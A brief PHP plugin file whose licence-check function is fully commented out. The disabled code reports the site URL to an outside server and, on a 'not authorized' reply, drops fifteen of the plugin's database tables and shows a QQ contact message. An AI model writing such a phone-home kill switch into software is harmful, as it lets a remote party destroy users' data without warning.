<?php
function fuckAway($pluginname, $url)
{
/*     $httpUrl = "http://mp.mamani.cn/authApi.php?plugin=" . $pluginname . "&url=" . $url;
    $gc = @file_get_contents($httpUrl);
    $result = json_decode($gc, true);
    if ($result['code'] == 500) {
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_member') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_card_log') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_group') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_goods') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_log') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_meal') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_order') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_poster_sysset') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_promote_qr') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_sysset') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_redpacks_sysset') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_commission_sysset') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_custom_sysset') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_sign_record') . ";");
        pdo_query("DROP TABLE IF EXISTS " . tablename('amouse_rebate_sign_user') . ";");
        message('域名未授权或者来源非法!联系QQ:214983937');
    } */
}
$_POST["authde"] = null;
unset($_POST["authde"]);